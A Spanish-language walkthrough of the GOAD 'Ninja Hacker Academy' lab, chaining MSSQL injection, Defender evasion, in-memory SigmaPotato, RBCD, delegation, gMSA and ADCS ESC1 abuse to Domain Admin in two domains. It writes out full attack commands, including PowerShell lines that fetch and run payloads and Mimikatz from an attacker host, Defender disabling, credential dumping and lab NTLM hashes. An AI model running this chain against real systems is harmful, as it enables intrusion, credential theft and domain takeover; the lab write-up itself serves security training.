**Dificultad:** Alta  
**Entorno:** Windows Server 2019 — dos dominios en bosque/confianza (`academy.ninja.lan` y `ninja.hack`), Windows Defender activo con protección en tiempo real en todas las máquinas  
**Objetivo:** Comprometer el lab GOAD **NHA (Ninja Hacker Academy)** partiendo de una única inyección SQL expuesta en un portal web, hasta Domain Admin en **dos dominios distintos**.

---

## Resumen

**NHA** es uno de los challenge labs de la serie [GOAD](https://github.com/Orange-Cyberdefense/GOAD) de Orange Cyberdefense. A diferencia de otros labs de la serie, aquí el punto de entrada no es Active Directory directamente, sino una aplicación web con una SQLi en MSSQL — y **todas** las máquinas tienen Windows Defender con protección en tiempo real activa, lo que convierte la escalada de privilegios inicial en una batalla de evasión tan larga como el propio movimiento lateral.

La cadena completa:

1. **SQLi** en el parámetro `orderBy` de un buscador de estudiantes → `xp_cmdshell` vía `sqlmap --os-shell` (stacked queries, MSSQL, time-based blind).
2. Desde `NT AUTHORITY\NETWORK SERVICE`, una larga batalla contra Defender (GodPotato, PrintSpoofer, mshta, regsvr32, ConPtyShell... todo bloqueado) hasta lograr privesc local con **SigmaPotato cargado en memoria por .NET reflection**.
3. Post-explotación: SAM/SYSTEM dump y `secretsdump` remoto revelan el hash de la cuenta de máquina `SQL$`.
4. **BloodHound** con la cuenta de máquina traza la ruta de ataque completa hasta Domain Admin.
5. Abuso de **RBCD** (`SQL$` → `GenericAll` sobre el contenedor `Computers`) para comprometer `WEB` vía impersonación S4U.
6. Extracción del NTLM de `frank` en `WEB` (mimikatz, tras desactivar Defender) y abuso de su **delegación restringida** hacia `SHARE`.
7. En `SHARE`, lectura de la contraseña de la **gMSA** `gmsaNFS$`, usada para forzar el cambio de contraseña de la cuenta `backup`.
8. `backup` → `Domain Admin` de `academy.ninja.lan` vía `net rpc group addmem`. **Flag 1.**
9. Desde ahí, pivote al segundo dominio del bosque, **`ninja.hack`**: abuso de ACLs (`dacledit`) para escalar de `olivia.davis` a `rachel.philips`, y finalmente un **template de ADCS mal configurado (ESC1-like)** para obtener un certificado como `Administrator@ninja.hack` y comprometer el segundo Domain Controller. **Flag 2 (final).**

## Fase 1: Reconocimiento y acceso inicial

El portal en `WEB` (10.6.6.21) expone un buscador de estudiantes:

```
http://10.6.6.21/Students?SearchString=test&orderBy=Firstname
```

El parámetro `orderBy` no está saneado y permite **stacked queries** contra MSSQL:

```bash
sqlmap -u "http://10.6.6.21/Students?SearchString=test&orderBy=Firstname" \
  -p orderBy --level=3 --risk=2 --os-shell --threads 3 --time-sec 1
```

sqlmap confirma inyección `Microsoft SQL Server/Sybase stacked queries` (time-based blind), detecta `xp_cmdshell` disponible y abre un `os-shell>` interactivo. El contexto de ejecución es `NT AUTHORITY\NETWORK SERVICE` — la cuenta de servicio de la instancia MSSQL Express en `SQL` (10.6.6.22).

> **Nota práctica:** en un canal `os-shell` time-based, cada comando cuyo output no te interesa debería responderse **`n`** a `do you want to retrieve the command standard output?`. Leer output largo carácter a carácter puede tardar horas — y sqlmap además cachea el output de un comando colgado en la sesión de la propia BBDD, lo que obliga a limpiar la caché (`rm -rf ~/.local/share/sqlmap/output/`) y relanzar con `--fresh-queries` si un comando se queda "pegado".

## Fase 2: De NETWORK SERVICE a admin local — la guerra contra Defender

Un intento directo de `net user hacker Password123! /add` devuelve **Error 5 (Access Denied)**: `NETWORK SERVICE` no es admin local. Pero `whoami /priv` confirma `SeImpersonatePrivilege` en `Enabled` — el clásico vector de las "Potato".

Lo que **no** funcionó, en orden:

- **GodPotato** — Defender lo detecta por firma estática al descargarlo.
- **PrintSpoofer** compilado desde fuente — descartado por no tener toolchain disponible en el equipo de ataque.
- **SigmaPotato vía `IEX(New-Object Net.WebClient).DownloadString(...)`** — falla en silencio porque el proyecto expone un binario `.exe` cargable por reflection, no un script `.ps1`.
- Reverse shells con `nc.exe` (incluso en base64 para evitar la firma estática), `ConPtyShell`, `mshta` + HTA, `regsvr32 /i:...scrobj.dll`, `wscript` + WMI — Defender bloquea sistemáticamente cualquier conexión saliente de PowerShell, y AMSI intercepta los `DownloadString` antes de que lleguen a ejecutarse.

Lo que **sí** funcionó — cargar el binario de [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato) (fork de GodPotato) **en memoria por .NET reflection**, sin tocar disco, invocando directamente su clase:

```powershell
powershell -c "[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://ATACANTE:PORT/SigmaPotato.exe')); [SigmaPotato]::Main('net user hacker Password123! /add')"
```

Y a continuación, el mismo patrón para meterlo en el grupo de administradores:

```powershell
powershell -c "[System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://ATACANTE:PORT/SigmaPotato.exe')); [SigmaPotato]::Main('net localgroup administrators hacker /add')"
```

Confirmación:

```bash
netexec smb 10.6.6.22 -u hacker -p 'Password123!' --local-auth
# SMB ... [+] SQL01\hacker:Password123! (admin)
```

Con eso, sesión estable vía **Evil-WinRM** como admin local, con `SeDebugPrivilege`, `SeImpersonatePrivilege` y `SeBackupPrivilege`:

```bash
evil-winrm -i 10.6.6.22 -u hacker -p 'Password123!'
```

## Fase 3: Post-explotación en SQL01

Con admin local, volcado de SAM/SYSTEM:

```powershell
reg save HKLM\SAM C:\Windows\Temp\sam.bak /y
reg save HKLM\SYSTEM C:\Windows\Temp\sys.bak /y
download C:\Windows\Temp\sam.bak
download C:\Windows\Temp\sys.bak
```

```bash
secretsdump.py -sam sam.bak -system sys.bak LOCAL
```

Más interesante aún, un `secretsdump` remoto directo contra la máquina revela **el hash de la cuenta de máquina del dominio**:

```bash
secretsdump.py hacker:'Password123!'@10.6.6.22
```

## Fase 4: BloodHound y la ruta de ataque

```bash
bloodhound-python -d academy.ninja.lan -u 'SQL$' --hashes ':<hash de SQL$>' \
  -ns 10.6.6.11 -c All --zip
```

El grafo revela la ruta completa hasta Domain Admins:

```
SQL$ → (GenericAll) → COMPUTERS container
COMPUTERS → (Contains) → WEB
WEB → (HasSession) → FRANK
FRANK → (AllowedToDelegate) → SHARE
SHARE → (ReadGMSAPassword) → GMSANFS$
GMSANFS$ → (ForceChangePassword) → BACKUP
BACKUP → (WriteOwner) → DOMAIN ADMINS
```

Además, `netexec smb --users` con el hash de `SQL$` lista 28 cuentas de dominio, entre ellas `sql_svc` (con SPN, Kerberoasteable) y `backup`. Un intento de Kerberoasting (`GetUserSPNs.py`) saca los TGS de `frank` y `sql_svc`, pero ninguno cae con rockyou + reglas — no hace falta: el grafo ya marca el camino real.

## Fase 5: SQL$ → WEB (abuso de RBCD)

`SQL$` no tiene permisos directos sobre `WEB$`, pero su `GenericAll` sobre el contenedor `Computers` le permite escribir el atributo `msDS-AllowedToActOnBehalfOfOtherIdentity` de cualquier equipo dentro — es decir, configurar **RBCD** a su favor:

```bash
rbcd.py -delegate-from 'SQL$' -delegate-to 'WEB$' -action write \
  -dc-ip 10.6.6.11 'academy.ninja.lan/SQL$' -hashes ':<hash de SQL$>'
```

Con eso, `SQL$` puede impersonar a cualquier usuario frente a `WEB` vía S4U2Self + S4U2Proxy:

```bash
getST.py -spn 'cifs/WEB.academy.ninja.lan' -impersonate Administrator \
  -dc-ip 10.6.6.11 'academy.ninja.lan/SQL$' -hashes ':<hash de SQL$>'

export KRB5CCNAME=Administrator@cifs_WEB.academy.ninja.lan@ACADEMY.NINJA.LAN.ccache
secretsdump.py -k -no-pass WEB.academy.ninja.lan -dc-ip 10.6.6.11
```

Con el hash local de `Administrator` de `WEB` en la mano, entramos por Evil-WinRM. El grafo decía que `frank` tiene sesión activa ahí — confirmado con `netexec smb --loggedon-users`.

## Fase 6: WEB → SHARE (delegación restringida de frank)

Volcar LSASS directamente (`nanodump`, `lsassy`, `mimikatz` remoto vía `netexec`) falla sistemáticamente por Defender, igual que en SQL01. La solución, una vez dentro por Evil-WinRM como admin local: **desactivar la protección en tiempo real primero**, y entonces sí, mimikatz funciona sin fricción:

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
IEX(New-Object Net.WebClient).DownloadString('http://ATACANTE:PORT/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

Esto revela el NTLM de `frank`:

<details markdown="1">
<summary>🔓 Ver hash de frank</summary>

```
frank:d4fad93561dee253398d5891e991a6fb
```

</details>

`frank` tiene **delegación restringida** hacia `eventlog/share.academy.ninja.lan` y `HTTP/web.academy.ninja.lan`. Con Rubeus (más tolerante con el cifrado RC4 que impacket en este escenario, que devolvía `STATUS_MORE_PROCESSING_REQUIRED` en bucle) se abusa esa delegación con un S4U completo, sustituyendo el servicio final:

```powershell
.\Rubeus.exe s4u /user:frank /rc4:<hash de frank> `
  /impersonateuser:administrator /msdsspn:eventlog/share.academy.ninja.lan `
  /altservice:cifs/share.academy.ninja.lan /dc:dc-ac.academy.ninja.lan /ptt
```

Alternativamente (la vía que terminó funcionando de forma más robusta): pass-the-hash directo de `frank` con mimikatz para lanzar un proceso en su contexto, y desde ahí `Invoke-Command` contra `SHARE` con autenticación Kerberos implícita:

```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:frank /domain:academy.ninja.lan /ntlm:<hash de frank> /run:cmd.exe"'
```

Una vez con ejecución como `frank`-vía-delegación en `SHARE`, repetimos el mismo patrón: desactivar Defender ahí también y confirmar admin local (`evil-winrm -i share.academy.ninja.lan -u Administrator -H <hash>`).

## Fase 7: gMSA, backup y Domain Admin (academy.ninja.lan) — Flag 1

Según el grafo, `SHARE$` puede leer la contraseña de la gMSA `gmsaNFS$`:

```bash
netexec ldap 10.6.6.11 -u 'SHARE$' -H <hash de SHARE$> --gmsa
```

<details markdown="1">
<summary>🔓 Ver contraseña de la gMSA</summary>

```
Account: gmsaNFS$   NTLM: af1c53b0fb7955cc722bd755c9f5e4a3   PrincipalsAllowedToReadPassword: SHARE$
```

</details>

Y `gmsaNFS$` puede forzar el cambio de contraseña de `backup`:

```bash
changepasswd.py 'academy.ninja.lan/backup'@10.6.6.11 -newpass 'Password123!' \
  -altuser 'gmsaNFS$' -althash '<hash de gmsaNFS$>' -reset
```

El último salto del grafo (`backup → WriteOwner → Domain Admins`) resultó más terco en la práctica de lo que sugería BloodHound: `Set-DomainObjectOwner` / `Add-DomainObjectAcl` de PowerView fallaban repetidamente (problemas de binding LDAP sin credencial explícita, "Access is denied" en el `net group` posterior a pesar de que el cambio de owner/DACL sí se aplicaba). Lo que terminó funcionando de forma directa fue usar las herramientas RPC de Samba contra el DC:

```bash
net rpc group addmem 'Domain Admins' 'backup' -U 'academy.ninja.lan/backup%Password123!' -S 10.6.6.11
```

```bash
netexec smb 10.6.6.11 -u backup -p 'Password123!' -d academy.ninja.lan
# SMB ... [+] academy.ninja.lan\backup:Password123! (admin)
```

Domain Admin de `academy.ninja.lan`. `secretsdump` con `backup` da el hash de `Administrator`, y con Evil-WinRM en `DC-AC`:

```
*Evil-WinRM* PS C:\Users\administrator\Desktop> type flag.txt
```

## Fase 8: El segundo dominio — ninja.hack — Flag final

El nombre de la propia flag es la pista: hay un **segundo dominio** en el bosque. Con Domain Admin en `academy.ninja.lan` y aprovechando la relación de confianza entre `academy.ninja.lan` y `ninja.hack`, aparece una cuenta válida en el dominio vecino:

```bash
netexec smb 10.6.6.10 -u olivia.davis -H <hash de olivia.davis> -d ninja.hack
```

<details markdown="1">
<summary>🔓 Ver hash de olivia.davis</summary>

```
[+] ninja.hack\olivia.davis:91d85135bb2c4e12c46efbb77612c487
```

</details>

Un **BloodHound** completo del nuevo dominio (`bloodhound-python -d ninja.hack -u olivia.davis -H ... -ns 10.6.6.10 -c All`) muestra que `olivia.davis` puede escalar por ACL: mediante `dacledit.py` se le concede `FullControl` sobre `rachel.philips`, y se resetea su contraseña:

```bash
dacledit.py -action write -rights FullControl -principal 'olivia.davis' -target 'rachel.philips' \
  -hashes ':<hash de olivia.davis>' -dc-ip 10.6.6.10 'ninja.hack/olivia.davis'

changepasswd.py 'ninja.hack/rachel.philips'@10.6.6.10 -newpass 'Password123!' \
  -altuser 'olivia.davis' -althash '<hash de olivia.davis>' -reset
```

`rachel.philips` pertenece (o se añade) al grupo **`JONIN`**, que tiene permisos de gestión sobre plantillas de certificados de AD CS. Enumerando con [Certipy](https://github.com/ly4k/Certipy) aparece una plantilla **`SignatureValidation`** manipulable — no vulnerable a ESC1 de fábrica, pero sí modificable para hacerlo:

```bash
certipy template -u 'rachel.philips@ninja.hack' -p 'Password123!' -dc-ip 10.6.6.10 \
  -template 'SignatureValidation' -write-default-configuration -force
```

Esto reescribe la configuración de la plantilla para permitir **autenticación de cliente**, **`Enrollee Supplies Subject`** y política de aplicación EKU de `Client Authentication` — el patrón clásico de **ESC1**. Con eso, se solicita un certificado suplantando al Administrador del dominio:

```bash
certipy req -u 'rachel.philips@ninja.hack' -p 'Password123!' -ca 'NINJA-CA' \
  -template 'SignatureValidation' -upn 'Administrator@ninja.hack' -dc-ip 10.6.6.10 \
  -subject 'CN=Administrator'
```

Y se autentica con el certificado para obtener un TGT y el hash NT del Administrador:

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.6.6.10
```

## Técnicas utilizadas

| Técnica | Descripción |
|---------|-------------|
| SQLi stacked queries (MSSQL) | Inyección en `orderBy`, `sqlmap --os-shell` sobre canal time-based blind |
| Defender evasion (reflection) | Carga en memoria de SigmaPotato vía `.NET reflection`, sin tocar disco |
| Local privesc (Potato) | Abuso de `SeImpersonatePrivilege` (`NETWORK SERVICE` → admin local) |
| Kerberoasting | `GetUserSPNs.py` sobre `sql_svc` y `frank` (no crackeado, no necesario) |
| RBCD | `SQL$` abusa su `GenericAll` sobre el contenedor `Computers` para comprometer `WEB` |
| Pass-the-hash + Kerberos S4U/delegación restringida | Uso del hash de `frank` para pivotar a `SHARE` vía su `AllowedToDelegate` |
| gMSA password abuse | Lectura de la contraseña de `gmsaNFS$` desde `SHARE$` (`ReadGMSAPassword`) |
| ForceChangePassword | `gmsaNFS$` resetea la contraseña de `backup` |
| RPC group membership | `net rpc group addmem` para añadir `backup` a Domain Admins |
| Cross-domain trust abuse | Reutilización de credenciales válidas en el dominio de confianza `ninja.hack` |
| ACL abuse (DACL) | `dacledit.py` concede `FullControl` de `olivia.davis` sobre `rachel.philips` |
| AD CS ESC1 (plantilla reescrita) | Modificación de la plantilla `SignatureValidation` + `certipy req`/`auth` para suplantar al Administrador |
